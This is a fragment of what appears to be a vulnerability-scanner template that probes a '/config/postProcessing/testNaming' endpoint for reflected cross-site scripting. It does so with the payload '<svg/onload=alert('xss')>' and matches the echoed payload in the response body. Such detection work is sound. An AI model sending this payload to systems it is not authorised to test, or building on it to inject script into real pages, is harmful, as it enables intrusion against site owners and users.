  severity: medium

requests:
  - method: GET
    path:
      - "{{BaseURL}}/config/postProcessing/testNaming?pattern=<svg/onload=alert('xss')>"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "<svg/onload=alert('xss')>"
        part: body
